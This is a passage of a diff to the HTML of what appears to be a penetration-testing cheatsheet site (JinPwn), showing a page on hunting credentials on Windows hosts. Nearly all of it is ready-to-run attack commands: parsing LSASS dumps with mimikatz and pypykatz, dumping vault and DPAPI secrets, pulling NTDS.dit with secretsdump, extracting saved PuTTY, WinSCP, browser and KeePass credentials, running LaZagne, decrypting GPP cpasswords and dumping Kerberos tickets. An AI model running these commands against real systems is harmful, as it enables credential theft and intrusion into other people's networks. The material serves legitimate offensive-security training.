+</span></span></code></pre></div><p>Or Task Manager GUI: Details -> right-click lsass.exe -> Create dump file.</p><p>Parse on attacker:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-pypykatz lsa minidump lsass.dmp
+</span></span><span class=line><span class=cl><span class=c1>## or</span>
+</span></span><span class=line><span class=cl>mimikatz.exe
+</span></span><span class=line><span class=cl>sekurlsa::minidump lsass.dmp
+</span></span><span class=line><span class=cl>sekurlsa::logonpasswords
+</span></span></code></pre></div><div class="obsidian-callout callout-warning"><div class=obsidian-callout-header><div class=obsidian-callout-icon aria-hidden=true><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m21.73 18-8-14a2 2 0 00-3.48.0l-8 14A2 2 0 004 21h16a2 2 0 001.73-3z"/><path d="M12 9v4"/><path d="M12 17h.01"/></svg></div><span class=obsidian-callout-title>LSA Protection</span></div><div class=obsidian-callout-body><p>Modern Windows (Server 2019+, Win10 with PPL enabled) protects LSASS with PPL. Standard procdump fails. Use PPLdump or PPLBlade to bypass.</p></div></div><h2 id=iii-windows-credential-manager--vault data-heading-permalink=true><span class=heading-content>iii. Windows Credential Manager / Vault</span>
+<a class=heading-permalink href=#iii-windows-credential-manager--vault aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Saved RDP creds, web creds, Windows logins:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>cmdkey /list
+</span></span></code></pre></div><p>Use them with runas without seeing the password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>runas /savecred /user:DOMAIN\Administrator <span class=s2>&#34;C:\Windows\Temp\sh.exe&#34;</span>
+</span></span></code></pre></div><p>Dump cleartext via Mimikatz:</p><pre tabindex=0><code>mimikatz.exe
 vault::list
 vault::cred /patch
-</code></pre><p>Direct vault file access (per-user DPAPI-encrypted):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /a:h /s <span class="nv">%userprofile%</span>\AppData\Local\Microsoft\Vault\
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> /a:h /s <span class="nv">%userprofile%</span>\AppData\Local\Microsoft\Credentials\
-</span></span></code></pre></div><h2 id="iv-dpapi-master-keys-and-credential-files" data-heading-permalink="true"><span class="heading-content">iv. DPAPI master keys and credential files</span>
-    <a class="heading-permalink" href="#iv-dpapi-master-keys-and-credential-files" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>DPAPI encrypts most user secrets. Get the master key, decrypt everything.</p>
-<p>Master key locations:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /a:h C:\Users\<span class="p">&lt;</span>user<span class="p">&gt;</span>\AppData\Roaming\Microsoft\Protect\<span class="p">&lt;</span>SID<span class="p">&gt;</span>\
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> /a:h C:\Users\<span class="p">&lt;</span>user<span class="p">&gt;</span>\AppData\Local\Microsoft\Credentials\
-</span></span></code></pre></div><p>Decrypt with mimikatz (need user&rsquo;s password OR domain DPAPI backup key from DC):</p>
-<pre tabindex="0"><code>mimikatz.exe
+</code></pre><p>Direct vault file access (per-user DPAPI-encrypted):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /a:h /s <span class=nv>%userprofile%</span>\AppData\Local\Microsoft\Vault\
+</span></span><span class=line><span class=cl><span class=k>dir</span> /a:h /s <span class=nv>%userprofile%</span>\AppData\Local\Microsoft\Credentials\
+</span></span></code></pre></div><h2 id=iv-dpapi-master-keys-and-credential-files data-heading-permalink=true><span class=heading-content>iv. DPAPI master keys and credential files</span>
+<a class=heading-permalink href=#iv-dpapi-master-keys-and-credential-files aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>DPAPI encrypts most user secrets. Get the master key, decrypt everything.</p><p>Master key locations:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /a:h C:\Users\<span class=p>&lt;</span>user<span class=p>&gt;</span>\AppData\Roaming\Microsoft\Protect\<span class=p>&lt;</span>SID<span class=p>&gt;</span>\
+</span></span><span class=line><span class=cl><span class=k>dir</span> /a:h C:\Users\<span class=p>&lt;</span>user<span class=p>&gt;</span>\AppData\Local\Microsoft\Credentials\
+</span></span></code></pre></div><p>Decrypt with mimikatz (need user&rsquo;s password OR domain DPAPI backup key from DC):</p><pre tabindex=0><code>mimikatz.exe
 dpapi::cred /in:C:\Users\u\AppData\Local\Microsoft\Credentials\HASHFILE
 dpapi::masterkey /in:&#34;C:\Users\u\AppData\Roaming\Microsoft\Protect\SID\MK&#34; /password:&#34;userpass&#34;
-</code></pre><p>Domain-wide DPAPI backup key, dump from DC (needs Domain Admin):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-secretsdump -system SYSTEM -security SECURITY -ntds NTDS.dit LOCAL
-</span></span><span class="line"><span class="cl"><span class="c1">## or</span>
-</span></span><span class="line"><span class="cl">mimikatz: lsadump::backupkeys /system:DC01 /export
-</span></span></code></pre></div><h2 id="v-saved-app-credentials" data-heading-permalink="true"><span class="heading-content">v. Saved app credentials</span>
-    <a class="heading-permalink" href="#v-saved-app-credentials" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>PuTTY saved sessions (clear-text proxy passwords, weakly-encrypted auth):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span> /s
-</span></span></code></pre></div><p>PuTTY private keys (.ppk):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Users\*.ppk
-</span></span></code></pre></div><p>WinSCP saved sessions:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKCU\Software\Martin Prikryl\WinSCP 2\Sessions&#34;</span> /s
-</span></span><span class="line"><span class="cl">## Decrypt with winscppasswd.py from impacket-examples or:
-</span></span><span class="line"><span class="cl">## https://github.com/anoopengineer/winscppasswd
-</span></span></code></pre></div><p>MobaXterm saved sessions:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b <span class="s2">&#34;</span><span class="nv">%userprofile%</span><span class="s2">\Documents\MobaXterm*&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">type</span> <span class="s2">&#34;</span><span class="nv">%userprofile%</span><span class="s2">\Documents\MobaXterm\MobaXterm.ini&#34;</span> <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl">## Decrypt with MobaXtermPasswordDecrypt
-</span></span></code></pre></div><p>FileZilla:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> <span class="s2">&#34;</span><span class="nv">%appdata%</span><span class="s2">\FileZilla\sitemanager.xml&#34;</span> <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl"><span class="k">type</span> <span class="s2">&#34;</span><span class="nv">%appdata%</span><span class="s2">\FileZilla\recentservers.xml&#34;</span> <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>OpenVPN:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Users\*.ovpn
-</span></span></code></pre></div><p>KeePass DB files:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Users\*.kdbx C:\Users\*.kdb <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>Crack with hashcat:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">keepass2john db.kdbx &gt; kp.hash
-</span></span><span class="line"><span class="cl">hashcat -m <span class="m">13400</span> kp.hash <span class="s2">&#34;</span><span class="nv">$WL</span><span class="s2">&#34;</span>
-</span></span></code></pre></div><h2 id="vi-browser-saved-credentials" data-heading-permalink="true"><span class="heading-content">vi. Browser saved credentials</span>
-    <a class="heading-permalink" href="#vi-browser-saved-credentials" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Chrome / Edge (Chromium-based, same format):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">type</span> <span class="s2">&#34;</span><span class="nv">%localappdata%</span><span class="s2">\Google\Chrome\User Data\Default\Login Data&#34;</span>      ## SQLite, DPAPI-encrypted passwords
-</span></span><span class="line"><span class="cl"><span class="k">type</span> <span class="s2">&#34;</span><span class="nv">%localappdata%</span><span class="s2">\Microsoft\Edge\User Data\Default\Login Data&#34;</span>
-</span></span></code></pre></div><p>Extract with SharpChrome (SharpDPAPI) or LaZagne. Browser creds need DPAPI master key (so user&rsquo;s password or session).</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">LaZagne.exe browsers
-</span></span><span class="line"><span class="cl">LaZagne.exe all                  ## kitchen sink
-</span></span></code></pre></div><p>Firefox stores creds in <code>logins.json</code>, decrypt with <code>firefox_decrypt.py</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /a:h <span class="s2">&#34;</span><span class="nv">%appdata%</span><span class="s2">\Mozilla\Firefox\Profiles\*\logins.json&#34;</span>
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> /a:h <span class="s2">&#34;</span><span class="nv">%appdata%</span><span class="s2">\Mozilla\Firefox\Profiles\*\key4.db&#34;</span>
-</span></span></code></pre></div><h2 id="vii-unattended-install-files" data-heading-permalink="true"><span class="heading-content">vii. Unattended install files</span>
-    <a class="heading-permalink" href="#vii-unattended-install-files" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>GPP, sysprep, MDT, SCCM dump passwords into XML files that admins forget to delete:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Windows\System32\sysprep\sysprep.xml C:\Windows\System32\sysprep\sysprep.inf <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Windows\system32\sysprep\Panther\setupact.log <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl">findstr /si pass *.xml *.ini *.txt *.config <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>GPP cpassword (when host pulls policy from SYSVOL):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">findstr /S /I cpassword \\<span class="nv">%USERDNSDOMAIN%</span>\sysvol\<span class="nv">%USERDNSDOMAIN%</span>\Policies\*.xml
-</span></span><span class="line"><span class="cl">## Or local cached:
-</span></span><span class="line"><span class="cl">findstr /S /I cpassword C:\ProgramData\Microsoft\Group Policy\*.xml
-</span></span></code></pre></div><p>Decrypt cpassword (AES key is public):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gpp-decrypt <span class="s1">&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
-</span></span></code></pre></div><h2 id="viii-powershell-history-recap-from-local-enum" data-heading-permalink="true"><span class="heading-content">viii. PowerShell history (recap from <a href="https://jinpwn.dev/cheatsheets/windows/w02-local-enum/">Local Enum</a>
+</code></pre><p>Domain-wide DPAPI backup key, dump from DC (needs Domain Admin):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>impacket-secretsdump -system SYSTEM -security SECURITY -ntds NTDS.dit LOCAL
+</span></span><span class=line><span class=cl><span class=c1>## or</span>
+</span></span><span class=line><span class=cl>mimikatz: lsadump::backupkeys /system:DC01 /export
+</span></span></code></pre></div><h2 id=v-saved-app-credentials data-heading-permalink=true><span class=heading-content>v. Saved app credentials</span>
+<a class=heading-permalink href=#v-saved-app-credentials aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>PuTTY saved sessions (clear-text proxy passwords, weakly-encrypted auth):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>reg query <span class=s2>&#34;HKCU\Software\SimonTatham\PuTTY\Sessions&#34;</span> /s
+</span></span></code></pre></div><p>PuTTY private keys (.ppk):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Users\*.ppk
+</span></span></code></pre></div><p>WinSCP saved sessions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>reg query <span class=s2>&#34;HKCU\Software\Martin Prikryl\WinSCP 2\Sessions&#34;</span> /s
+</span></span><span class=line><span class=cl>## Decrypt with winscppasswd.py from impacket-examples or:
+</span></span><span class=line><span class=cl>## https://github.com/anoopengineer/winscppasswd
+</span></span></code></pre></div><p>MobaXterm saved sessions:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b <span class=s2>&#34;</span><span class=nv>%userprofile%</span><span class=s2>\Documents\MobaXterm*&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>type</span> <span class=s2>&#34;</span><span class=nv>%userprofile%</span><span class=s2>\Documents\MobaXterm\MobaXterm.ini&#34;</span> <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>## Decrypt with MobaXtermPasswordDecrypt
+</span></span></code></pre></div><p>FileZilla:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>type</span> <span class=s2>&#34;</span><span class=nv>%appdata%</span><span class=s2>\FileZilla\sitemanager.xml&#34;</span> <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>type</span> <span class=s2>&#34;</span><span class=nv>%appdata%</span><span class=s2>\FileZilla\recentservers.xml&#34;</span> <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>OpenVPN:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Users\*.ovpn
+</span></span></code></pre></div><p>KeePass DB files:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Users\*.kdbx C:\Users\*.kdb <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>Crack with hashcat:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>keepass2john db.kdbx &gt; kp.hash
+</span></span><span class=line><span class=cl>hashcat -m <span class=m>13400</span> kp.hash <span class=s2>&#34;</span><span class=nv>$WL</span><span class=s2>&#34;</span>
+</span></span></code></pre></div><h2 id=vi-browser-saved-credentials data-heading-permalink=true><span class=heading-content>vi. Browser saved credentials</span>
+<a class=heading-permalink href=#vi-browser-saved-credentials aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>Chrome / Edge (Chromium-based, same format):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>type</span> <span class=s2>&#34;</span><span class=nv>%localappdata%</span><span class=s2>\Google\Chrome\User Data\Default\Login Data&#34;</span>      ## SQLite, DPAPI-encrypted passwords
+</span></span><span class=line><span class=cl><span class=k>type</span> <span class=s2>&#34;</span><span class=nv>%localappdata%</span><span class=s2>\Microsoft\Edge\User Data\Default\Login Data&#34;</span>
+</span></span></code></pre></div><p>Extract with SharpChrome (SharpDPAPI) or LaZagne. Browser creds need DPAPI master key (so user&rsquo;s password or session).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>LaZagne.exe browsers
+</span></span><span class=line><span class=cl>LaZagne.exe all                  ## kitchen sink
+</span></span></code></pre></div><p>Firefox stores creds in <code>logins.json</code>, decrypt with <code>firefox_decrypt.py</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /a:h <span class=s2>&#34;</span><span class=nv>%appdata%</span><span class=s2>\Mozilla\Firefox\Profiles\*\logins.json&#34;</span>
+</span></span><span class=line><span class=cl><span class=k>dir</span> /a:h <span class=s2>&#34;</span><span class=nv>%appdata%</span><span class=s2>\Mozilla\Firefox\Profiles\*\key4.db&#34;</span>
+</span></span></code></pre></div><h2 id=vii-unattended-install-files data-heading-permalink=true><span class=heading-content>vii. Unattended install files</span>
+<a class=heading-permalink href=#vii-unattended-install-files aria-label="Link to this section"><span aria-hidden=true>#</span></a></h2><p>GPP, sysprep, MDT, SCCM dump passwords into XML files that admins forget to delete:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Unattend.xml C:\Windows\Panther\Unattend.xml C:\Windows\Panther\Unattend\Unattend.xml <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Windows\System32\sysprep\sysprep.xml C:\Windows\System32\sysprep\sysprep.inf <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl><span class=k>dir</span> /s /b C:\Windows\system32\sysprep\Panther\setupact.log <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span><span class=line><span class=cl>findstr /si pass *.xml *.ini *.txt *.config <span class=mi>2</span><span class=p>&gt;</span>nul
+</span></span></code></pre></div><p>GPP cpassword (when host pulls policy from SYSVOL):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>findstr /S /I cpassword \\<span class=nv>%USERDNSDOMAIN%</span>\sysvol\<span class=nv>%USERDNSDOMAIN%</span>\Policies\*.xml
+</span></span><span class=line><span class=cl>## Or local cached:
+</span></span><span class=line><span class=cl>findstr /S /I cpassword C:\ProgramData\Microsoft\Group Policy\*.xml
+</span></span></code></pre></div><p>Decrypt cpassword (AES key is public):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gpp-decrypt <span class=s1>&#39;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#39;</span>
+</span></span></code></pre></div><h2 id=viii-powershell-history-recap-from-local-enum data-heading-permalink=true><span class=heading-content>viii. PowerShell history (recap from <a href=https://jinpwn.dev/cheatsheets/windows/w02-local-enum/>Local Enum</a>
 )</span>
-    <a class="heading-permalink" href="#viii-powershell-history-recap-from-local-enum" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Every command typed in PowerShell with PSReadLine gets logged. Common cred source:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ChildItem</span> <span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\*\</span><span class="n">AppData</span><span class="p">\</span><span class="n">Roaming</span><span class="p">\</span><span class="n">Microsoft</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">PowerShell</span><span class="p">\</span><span class="n">PSReadLine</span><span class="p">\</span><span class="n">ConsoleHost_history</span><span class="p">.</span><span class="py">txt</span> <span class="n">-EA</span> <span class="n">SilentlyContinue</span> <span class="p">|</span> <span class="p">%{</span> <span class="nb">Write-Host</span> <span class="nv">$_</span><span class="p">.</span><span class="n">FullName</span><span class="p">;</span> <span class="nb">Get-Content</span> <span class="nv">$_</span><span class="p">.</span><span class="py">FullName</span> <span class="p">}</span>
-</span></span></code></pre></div><h2 id="ix-application-configs-and-webconfig" data-heading-permalink="true"><span class="heading-content">ix. Application configs and web.config</span>
-    <a class="heading-permalink" href="#ix-application-configs-and-webconfig" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>ASP.NET applications often have DB connection strings in <code>web.config</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\inetpub\wwwroot\*\web.config <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl">findstr /si <span class="s2">&#34;connectionString\|password\|pwd&#34;</span> C:\inetpub\wwwroot\*\web.config <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>Decrypt protected sections of web.config (requires being the app pool identity):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">C<span class="p">:</span><span class="nl">\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_regiis.exe</span><span class="c1"> -pdf &#34;connectionStrings&#34; C:\inetpub\wwwroot\app</span>
-</span></span></code></pre></div><p>App.config for .NET desktop apps:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\Program Files*\*.config <span class="mi">2</span><span class="p">&gt;</span>nul <span class="p">|</span> findstr /v Microsoft
-</span></span></code></pre></div><h2 id="x-kerberos-cached-tickets" data-heading-permalink="true"><span class="heading-content">x. Kerberos cached tickets</span>
-    <a class="heading-permalink" href="#x-kerberos-cached-tickets" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>If you can read another user&rsquo;s Kerberos cache, you have their TGT. Triton/Rubeus dump:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">klist
-</span></span><span class="line"><span class="cl">Rubeus.exe dump
-</span></span><span class="line"><span class="cl">Rubeus.exe triage
-</span></span></code></pre></div><p>Save and use elsewhere, see <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">AD MOC</a>
- -&gt; Pass-the-Ticket.</p>
-<h2 id="xi-ssh-on-windows" data-heading-permalink="true"><span class="heading-content">xi. SSH on Windows</span>
-    <a class="heading-permalink" href="#xi-ssh-on-windows" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>OpenSSH client and server are built-in on modern Windows. SSH keys often present:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /a /s C:\Users\*\.ssh\id_*
-</span></span><span class="line"><span class="cl"><span class="k">type</span> <span class="nv">%userprofile%</span>\.ssh\known_hosts
-</span></span><span class="line"><span class="cl"><span class="k">type</span> <span class="nv">%userprofile%</span>\.ssh\config
-</span></span></code></pre></div><h2 id="xii-outlook-pst-and-ost" data-heading-permalink="true"><span class="heading-content">xii. Outlook PST and OST</span>
-    <a class="heading-permalink" href="#xii-outlook-pst-and-ost" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>User&rsquo;s email archive, often contains password reset emails, internal docs with creds:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b <span class="s2">&#34;</span><span class="nv">%localappdata%</span><span class="s2">\Microsoft\Outlook\*.pst&#34;</span> <span class="s2">&#34;</span><span class="nv">%localappdata%</span><span class="s2">\Microsoft\Outlook\*.ost&#34;</span> <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>Read offline with <code>libpff</code>, <code>readpst</code>, or open in Outlook on attacker.</p>
-<h2 id="xiii-backup-files-everywhere" data-heading-permalink="true"><span class="heading-content">xiii. Backup files everywhere</span>
-    <a class="heading-permalink" href="#xiii-backup-files-everywhere" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Backup files are the goldmine, admins always forget them:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s /b C:\*.bak C:\*.backup C:\*.old C:\*.orig <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span><span class="line"><span class="cl">where /r C:\ *.bak *.old *.config.bak <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>Pay attention to <code>C:\Windows\repair\</code> (SAM/SYSTEM legacy backups) and <code>C:\Users\*\Documents\</code>.</p>
-<h2 id="xiv-recycle-bin" data-heading-permalink="true"><span class="heading-content">xiv. Recycle Bin</span>
-    <a class="heading-permalink" href="#xiv-recycle-bin" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Other users&rsquo; deleted files, often readable:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /a /s C:\$Recycle.Bin <span class="mi">2</span><span class="p">&gt;</span>nul
-</span></span></code></pre></div><p>The filenames are mangled but readable per-SID subdirectories tell you who deleted them.</p>
-<h2 id="xv-memory-dumps-and-crash-dumps" data-heading-permalink="true"><span class="heading-content">xv. Memory dumps and crash dumps</span>
-    <a class="heading-permalink" href="#xv-memory-dumps-and-crash-dumps" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<p>Service crashes can dump LSASS-like content:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl"><span class="k">dir</span> /s C:\Windows\Minidump\
-</span></span><span class="line"><span class="cl"><span class="k">dir</span> C:\Windows\MEMORY.DMP
-</span></span></code></pre></div><p>Read with WinDbg or <code>strings</code> for cred fragments.</p>
-<h2 id="xvi-after-cred-where-to-use-it" data-heading-permalink="true"><span class="heading-content">xvi. After cred, where to use it</span>
-    <a class="heading-permalink" href="#xvi-after-cred-where-to-use-it" aria-label="Link to this section">
-      <span aria-hidden="true">#</span>
-    </a></h2>
-<ul>
-<li>Local user privesc -&gt; <code>runas</code> or RDP</li>
-<li>Lateral to another host -&gt; <a href="https://jinpwn.dev/cheatsheets/windows/w11-lateral-movement/">Lateral Movement</a>
-</li>
-<li>AD domain -&gt; <a href="https://jinpwn.dev/cheatsheets/active-directory/00-ad-moc/">AD MOC</a>
-</li>
-<li>Cloud creds -&gt; <a href="https://jinpwn.dev/cheatsheets/cloud/00-cloud-moc/">Cloud MOC</a>
-</li>
-</ul>
-
-        </div>
-
-        
-          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/windows/w05-privesc---dll--unquoted-paths/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Previous</span>
-              <span class="cheatsheet-pager-title">PrivEsc - DLL &amp; Unquoted Paths</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/windows/w07-uac-bypass/">
-            <div class="cheatsheet-pager-copy">
-              <span class="cheatsheet-pager-label">Next</span>
-              <span class="cheatsheet-pager-title">UAC Bypass</span>
-            </div>
-            <span class="cheatsheet-pager-arrow" aria-hidden="true">
-              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
-    <path d="m12 19-7-7 7-7"></path>
-    <path d="M19 12H5"></path>
-  </svg>
-            </span>
-          </a></nav>
-        
-      </div>
-    </div>
-  </article>
-  
-
-  </main>
-  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
-    <svg viewBox="0 0 24 24" aria-hidden="true">
-      <path d="M12 18V6"></path>
-      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
-    </svg>
-  </button>
-  <footer class="site-footer">
-  <p>&copy; 2026 JinPwn</p>
